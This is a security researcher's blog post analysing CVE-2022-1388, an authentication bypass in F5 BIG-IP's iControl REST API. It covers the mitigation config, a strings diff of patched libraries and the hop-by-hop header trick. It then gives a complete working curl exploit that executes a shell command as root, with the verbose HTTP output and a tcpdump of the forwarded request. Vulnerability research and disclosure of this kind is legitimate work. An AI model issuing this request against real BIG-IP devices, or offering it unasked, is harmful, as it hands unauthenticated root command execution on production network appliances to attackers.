---
title: "F5 BIG-IP iControl REST vulnerability CVE-2022-1388"
date: 2022-05-09T16:42:00+01:00
author: "Matus Bursa"
tags: ["F5", "CVE-2022-1388", "BIG-IP", "REST", "API"]
categories: ["vulns"]
---

Good afternoon to every security researcher. I would like to share my experience of finding announced vulnerability by internal F5 security team and writing the exploit for [CVE-2022-1388](https://support.f5.com/csp/article/K23605346).

You can read more about this vulnerability on [thehackernews](https://thehackernews.com/2022/05/f5-warns-of-new-critical-big-ip-remote.html) or [helpnetsecurity](https://www.helpnetsecurity.com/2022/05/09/cve-2022-1388-poc-exploitation/). [iControl REST](https://clouddocs.f5.com/api/icontrol-rest/) is an API for interaction between scripts and *F5 device*, used to manage and control that device automatically.  

Based on the details of the *mitigation*, the problem should be somewhere in the `Connection: ` header.

### mitigation
```apache
<If \"%{HTTP:connection} =~ /close/i \">
RequestHeader set connection close
</If>
<ElseIf \"%{HTTP:connection} =~ /keep-alive/i \">
RequestHeader set connection keep-alive
</ElseIf>
<Else>
    RequestHeader set connection close
</Else>
```

### inside the library

If we use `diff` and `strings` commands, we can see which strings were changed/added to the library, so I decided to download one from the vulnerable version `BIGIP-16.1.0-0.0.19` and one from the fixed version `BIGIP-16.1.2.2-0.0.28`

```bash
$ diff  <(strings mod_auth_pam.so_new ) <(strings mod_auth_pam.so_old)
...
259,261d243
< Connection
< close
< keep-alive
268d249
...
```

### header Connection

We know that in F5, there is `Jetty` server without authentication on `TCP/8100`, which we can hit for example from `localhost` (F5 device). We also know that there is `Apache` which does the *Authentication* for `Jetty`. We also know that we can abuse [hop-by-hop header](https://book.hacktricks.xyz/pentesting-web/abusing-hop-by-hop-headers) there, but we don't know which header we should pass to the `Connection` header. For more details about hop-by-hop headers you can read [RFC2616](https://datatracker.ietf.org/doc/html/rfc2616#section-13.5.1)


### exploit

After couple of hours and tries I found the requirements to make the exploit functionable:
- `X-F5-Auth-Token` header must be present (that's a requirement for Apache sends request to Jetty backend)
- `Connection` header *must* include `X-F5-Auth-Token` (based on hop-by-hop headers this will delete `X-F5-Auth-Token` from the request sended to the backend)
- `Host` header *must* be `localhost` or `127.0.0.1` (Jetty either checks this value or you can put `X-Forwarded-Host` to `Connection` header to make `X-Forwarded-Host` header invisible for Jetty)
- `Authentication` header *must* be `admin` user

*curl*
```bash
$ curl -vvv -sk -X POST -H 'Content-Type: application/json' 'https://admin@192.168.52.10/mgmt/tm/util/bash' --data '{"command": "run" , "utilCmdArgs": " -c id
" }' -H 'X-F5-Auth-Token: -' -H 'Connection: close, X-F5-Auth-Token' -H 'Host: localhost'
*   Trying 192.168.52.10:443...
* Connected to 192.168.52.10 (192.168.52.10) port 443 (#0)
* ALPN, offering h2
* ALPN, offering http/1.1
* successfully set certificate verify locations:
*  CAfile: /etc/ssl/cert.pem
*  CApath: none
* (304) (OUT), TLS handshake, Client hello (1):
* (304) (IN), TLS handshake, Server hello (2):
* TLSv1.2 (IN), TLS handshake, Certificate (11):
* TLSv1.2 (IN), TLS handshake, Server key exchange (12):
* TLSv1.2 (IN), TLS handshake, Server finished (14):
* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):
* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.2 (OUT), TLS handshake, Finished (20):
* TLSv1.2 (IN), TLS change cipher, Change cipher spec (1):
* TLSv1.2 (IN), TLS handshake, Finished (20):
* SSL connection using TLSv1.2 / ECDHE-RSA-AES128-GCM-SHA256
* ALPN, server did not agree to a protocol
* Server certificate:
*  subject: C=--; ST=WA; L=Seattle; O=MyCompany; OU=MyOrg; CN=localhost.localdomain; emailAddress=root@localhost.localdomain
*  start date: May  7 08:55:32 2022 GMT
*  expire date: May  4 08:55:32 2032 GMT
*  issuer: C=--; ST=WA; L=Seattle; O=MyCompany; OU=MyOrg; CN=localhost.localdomain; emailAddress=root@localhost.localdomain
*  SSL certificate verify result: self signed certificate (18), continuing anyway.
* Server auth using Basic with user 'admin'
> POST /mgmt/tm/util/bash HTTP/1.1
> Host: localhost
> Authorization: Basic YWRtaW46
> User-Agent: curl/7.79.1
> Accept: */*
> Content-Type: application/json
> X-F5-Auth-Token: -
> Connection: close, X-F5-Auth-Token
> Content-Length: 45
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Tue, 10 May 2022 05:18:22 GMT
< Server: Jetty(9.2.22.v20170606)
< X-Frame-Options: SAMEORIGIN
< Strict-Transport-Security: max-age=16070400; includeSubDomains
< Content-Type: application/json; charset=UTF-8
< Allow:
< Pragma: no-cache
< Cache-Control: no-store
< Cache-Control: no-cache
< Cache-Control: must-revalidate
< Expires: -1
< Content-Length: 168
< X-Content-Type-Options: nosniff
< X-XSS-Protection: 1; mode=block
< Content-Security-Policy: default-src 'self'  'unsafe-inline' 'unsafe-eval' data: blob:; img-src 'self' data:  http://127.4.1.1 http://127.4.2.1
< Connection: close
<
* Closing connection 0
* TLSv1.2 (OUT), TLS alert, close notify (256):
{"kind":"tm:util:bash:runstate","command":"run","utilCmdArgs":" -c id","commandResult":"uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:initrc_t:s0\n"}
```

*tcpdump* on F5 device
```bash
$ tcpdump -i lo -s 0 -A 'tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504F5354'
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on lo, link-type EN10MB (Ethernet), capture size 65535 bytes
22:18:22.457963 IP localhost.localdomain.59668 > localhost.localdomain.xprint-server: Flags [P.], seq 2917914269:2917914711, ack 2716646422, win 342, options [nop,nop,TS val 245887457 ecr 245887457], length 442
E...'.@.@..........................V.......
........POST /mgmt/tm/util/bash HTTP/1.1
Host: localhost:8100
Authorization: Basic YWRtaW46
User-Agent: curl/7.79.1
Accept: */*
Content-Type: application/json
Local-Ip-From-Httpd: 192.168.52.10
X-F5-New-Authtok-Reqd: false
X-Forwarded-Proto: http
X-Forwarded-For: 192.168.52.1
X-Forwarded-Host: localhost
X-Forwarded-Server: localhost.localdomain
Connection: Keep-Alive
Content-Length: 45

{"command": "run" , "utilCmdArgs": " -c id" }
22:18:22.461910 IP localhost.localdomain.50416 > localhost.localdomain.48470: Flags [P.], seq 3235108301:3235108827, ack 1593436189, win 3631, options [nop,nop,TS val 245887461 ecr 245836911], length 526
E..B.d@.@.PO...........V....^....../.7.....
......,oPOST /tmapi_mapper/util/bash HTTP/1.1
Content-Type: application/json
Authorization: Basic YWRtaW46
X-Forwarded-For: 192.168.52.1
X-F5-Config-Api-Status: 1907
Referer: 192.168.52.1
User-Agent: com.f5.rest.common.RestRequestSender
Accept: */*
Connection: Keep-alive
X-Forwarded-Proto: http
X-Forwarded-Host: localhost
X-F5-New-Authtok-Reqd: false
Local-Ip-From-Httpd: 192.168.52.10
X-Forwarded-Server: localhost.localdomain
Content-Length: 45
Host: localhost:48470

{"command": "run" , "utilCmdArgs": " -c id" }
```

That's all from my side, you can look at python [exploit](https://github.com/horizon3ai/CVE-2022-1388) from [Horizon3Attack team](https://twitter.com/Horizon3Attack) or read their [blog: F5 iControl REST vulnerability.](https://www.horizon3.ai/f5-icontrol-rest-endpoint-authentication-bypass-technical-deep-dive/)

### twitter story

{{< tweet BursaMatus 1523379163914137600 >}}
